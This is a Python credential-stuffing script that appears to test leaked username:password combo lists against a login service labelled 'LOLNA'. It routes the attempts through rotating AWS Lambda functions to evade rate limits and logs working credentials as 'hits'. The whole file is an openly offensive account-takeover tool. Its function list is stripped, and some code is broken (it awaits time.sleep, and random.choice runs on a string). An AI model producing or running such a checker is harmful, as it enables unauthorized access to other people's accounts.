import sys
import asyncio
import aioboto3
import aiofiles
import json
import time
import random

result_list = open("results.txt", "a")
result_stats = {'hits': 0, 'failures': 0, 'retries': 0}
retries = []

functions = 'removed_for_safety'


async def check_account(entry, data):
    async with aioboto3.client('lambda', region_name=random.choice(functions).split(':')[3]) as client:
        failure = True
        tries = 0
        max_tries = 10

        while failure and tries <= max_tries:
            response = await client.invoke(
                FunctionName=random.choice(functions),
                InvocationType='RequestResponse',
                LogType='None',
                Payload=json.dumps({'site': 'LOLNA', 'user_name': data[0], 'password': data[1]})
            )

            result = json.loads(await response['Payload'].read())
            if 'HTTPError' in result:
                failure = True
                result_stats['retries'] += 1
                await time.sleep(15)
                tries += 1
                continue

            if 'message' not in result.keys():
                result_stats['retries'] += 1
                tries += 1
                continue

            failure = False

        if tries == max_tries and failure is True:
            retries.append(entry
                           )
        token_response = json.loads(result['message'])

        # sometimes lambda will give us back a bad response
        if not token_response:
            return

        # determine if invalid, error, or hit
        if 'access_token' in token_response:
            result_list.write("{}\n".format(entry))
            result_stats['hits'] += 1
        elif 'Access denied' in token_response:
            result_stats['retries'] += 1
        elif 'invalid_credentials' in token_response:
            result_stats['failures'] += 1

async def runner():
    print("Creator: Github.com/cxmplex")
    combo_list = sys.argv[1]
    async with aiofiles.open(combo_list, encoding="utf8") as combos:
        async for entry in combos:
            loop.create_task(check_account(entry, entry.split(':')))
            print("Hits: {} Failures: {} Retries: {}"
                  .format(result_stats['hits'], result_stats['failures'], result_stats['retries']))


loop = asyncio.get_event_loop()
loop.run_until_complete(runner())
